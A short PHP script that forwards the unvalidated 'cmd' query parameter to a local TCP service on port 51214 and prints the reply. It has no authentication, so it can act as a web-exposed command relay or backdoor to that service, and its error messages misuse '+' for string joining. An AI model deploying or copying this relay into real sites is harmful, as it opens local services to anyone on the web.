<?php
set_time_limit(5);

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) or die("socket creation failed; "+socket_strerror(socket_last_error()));
$res = socket_connect($socket, '127.0.0.1', 51214) or die("socket connection failed; "+socket_strerror(socket_last_error($socket)));

socket_write($socket, $_GET['cmd']);
echo socket_read($socket, 2048);

socket_close($socket);
?>